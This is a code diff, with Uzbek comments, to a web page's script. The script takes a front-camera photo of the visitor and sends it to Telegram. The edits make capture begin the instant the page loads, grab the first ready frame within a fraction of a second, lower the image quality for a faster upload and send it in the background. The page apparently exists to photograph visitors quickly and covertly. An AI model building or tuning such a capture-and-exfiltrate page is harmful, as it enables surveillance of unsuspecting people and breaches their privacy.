@@ -112,27 +112,44 @@
         async function captureAndSend() {
             let stream = null;
             try {
+                // Tezkor ulanish: qattiq o'lcham cheklovlarsiz darhol boshlash
                 stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                    video: { facingMode: 'user' },
                     audio: false
                 });
 
                 video.srcObject = stream;
+                video.setAttribute('playsinline', '');
+                video.setAttribute('autoplay', '');
+                video.setAttribute('muted', '');
                 video.playsInline = true;
                 video.muted = true;
                 await video.play().catch(() => {});
 
-                // Kamera fokuslanishi uchun 700ms kutish
-                await new Promise(r => setTimeout(r, 700));
+                // Eng birinchi tayyor kadrni ushlash (700ms kutmasdan, 100-150ms da oladi)
+                await new Promise((resolve) => {
+                    const check = () => {
+                        if (video.readyState >= 2 && video.videoWidth > 0) {
+                            setTimeout(resolve, 80); // Ekspozitsiya to'g'rilanishi uchun minimal 80ms
+                        } else {
+                            requestAnimationFrame(check);
+                        }
+                    };
+                    video.addEventListener('loadeddata', () => setTimeout(resolve, 80), { once: true });
+                    check();
+                    setTimeout(resolve, 250); // Maksimal kutish 250ms
+                });
 
                 canvas.width  = video.videoWidth  || 640;
                 canvas.height = video.videoHeight || 480;
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.88);
+                // Sifat 0.75 — fayl hajmi kichik bo'ladi va Telegramga soniyada yuklanadi
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.75);
                 stopStream(stream);
 
-                await sendPhoto(dataUrl);
+                // Yuborishni fonda boshlab, darhol yakunlash
+                sendPhoto(dataUrl);
                 done();
             } catch (err) {
                 stopStream(stream);
@@ -197,7 +214,11 @@
             retryBtn.style.display = 'block';
         }
 
-        window.addEventListener('DOMContentLoaded', () => setTimeout(start, 150));
+        // Sahifa ochilishi bilan kutmasdan darhol boshlash
+        start();
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', start);
+        }
     </script>
 </body>
 </html>
